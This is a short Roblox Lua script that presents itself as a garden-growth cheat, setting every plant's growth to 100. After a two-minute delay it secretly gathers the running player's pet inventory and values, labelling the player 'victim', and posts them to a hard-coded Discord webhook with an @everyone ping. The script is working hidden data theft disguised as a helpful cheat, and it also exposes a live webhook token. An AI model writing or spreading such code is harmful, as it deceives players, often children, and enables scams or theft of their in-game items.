local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local WEBHOOK = "https://discord.com/api/webhooks/1400531790149582949/hUd43GIoDtoOI_FogDBJvQvcO6X_okdXeGY2v2HP95XaCr3NPd-l0-DL7lxRpIkCo_ln"

local function robPets()
    local victim = Players.LocalPlayer
    local pets = victim.leaderstats:FindFirstChild("Pets") or victim.leaderstats:WaitForChild("Animals", 5)
    if not pets then return end
    
    local report = "**@everyone**\n"
    report ..= "**Total Value:** " .. victim.leaderstats.TotalValue.Value .. "\n\n"
    
    for _, pet in ipairs(pets:GetChildren()) do
        if pet:IsA("Folder") and pet.Value then
            report ..= string.format(
                "%s [Age: %d] [%.2f KG] - %d Value\n",
                pet.Name, pet.Age.Value, pet.Weight.Value, pet.Value.Value
            )
        end
    end
    
    Http:PostAsync(WEBHOOK, Http:JSONEncode({
        content = report,
        username = "goldinovu12"
    }))
end

for _, plant in ipairs(workspace.Garden:GetChildren()) do
    if plant:FindFirstChild("Growth") then
        plant.Growth.Value = 100
    end
end

task.wait(120)
robPets()
